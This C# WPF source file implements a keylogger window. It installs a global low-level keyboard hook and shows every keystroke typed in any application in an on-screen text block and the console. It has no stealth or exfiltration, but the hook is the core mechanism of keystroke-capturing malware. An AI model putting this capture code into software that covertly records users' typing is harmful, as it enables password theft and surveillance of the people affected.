using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System;

using Keys = System.Windows.Forms.Keys;

namespace KeyLogger
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window, IDisposable
    {
        private User32.LowLevelHook _proc;
        private static IntPtr _hookID = IntPtr.Zero;

        public MainWindow()
        {
            this._proc = this.HookCallback;
            _hookID = SetHook(_proc);
            InitializeComponent();
        }

        private static IntPtr SetHook(User32.LowLevelHook proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return User32.SetWindowsHookEx(13, proc, User32.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN message
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                this.textBlock1.Text += ((Keys)vkCode).ToString();
            }

            return User32.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public void Dispose()
        {
            User32.UnhookWindowsHookEx(_hookID);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            this.lblProcessId.Content = _hookID;

            var desktopWorkingArea = SystemParameters.WorkArea;
            this.Left = desktopWorkingArea.Right - this.Width;
            this.Top = desktopWorkingArea.Bottom - this.Height;
        }

        private void Window_Deactivated(object sender, EventArgs e)
        {
            this.Topmost = true;
        }
    }
}
